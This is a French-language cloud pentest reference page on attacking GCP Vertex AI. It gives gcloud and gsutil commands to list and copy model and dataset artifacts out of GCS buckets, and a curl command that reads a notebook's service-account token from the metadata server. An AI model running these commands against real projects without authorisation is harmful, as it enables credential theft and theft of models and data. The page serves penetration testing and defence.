---
title: "Vertex AI : comptes de service des notebooks et des jobs d'entraînement et vol de modèles"
order: 3
description: "Attaquer Vertex AI : comptes de service des notebooks et des jobs d'entraînement, vol de modèles et de datasets, et exécution de pipelines."
keywords:
  - Vertex AI
  - notebook
  - training job
  - model theft
  - service account
  - ML
---

# Vertex AI

Vertex AI est la plateforme ML managée de GCP, et elle s'attaque de deux façons : pour les **données et les modèles** qu'elle détient (datasets d'entraînement, artefacts de modèles ajustés dans GCS), et en tant que **calcul s'exécutant sous un compte de service**. Un notebook managé ou un job d'entraînement personnalisé s'exécute sous un compte de service attaché ; en créer un constitue donc un chemin de déploiement sous compte de service, et le serveur de métadonnées du notebook distribue le jeton de ce compte.

## Vol de modèles et de datasets

```bash
gcloud ai models list --region <region>
gcloud ai models upload --help     # (inverse: export/download artifacts from the model's GCS URI)
gsutil -m cp -r gs://<model-bucket>/ .      # pull the artifacts the model points at
gcloud ai datasets list --region <region>
```

## Le notebook comme point d'appui sur un compte de service

```bash
# a notebook runs as --service-account; from inside it, read the token
curl -s -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
```

## Notes d'exploitation

- Créer un notebook ou un job d'entraînement avec un `--service-account` privilégié est l'angle d'élévation de privilèges et est traité dans [actAs: Vertex AI notebook](../identity/privilege-escalation/act-as-deployment/vertex-ai-notebook.md) ; cette page porte sur le vol de données et de modèles.
- Les artefacts de modèles et les données d'entraînement résident dans des buckets GCS ; les objets Vertex pointent vers eux, de sorte que l'accès au bucket raccourcit souvent l'ensemble du service.

## Outils

- **gcloud** (`ai models`, `ai custom-jobs`, `notebooks instances`).
- **gsutil** : récupérer les artefacts de modèles et de datasets depuis GCS.

## Références

- [HackTricks Cloud: GCP Vertex AI](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google Cloud: Vertex AI access control](https://cloud.google.com/vertex-ai/docs/general/access-control)
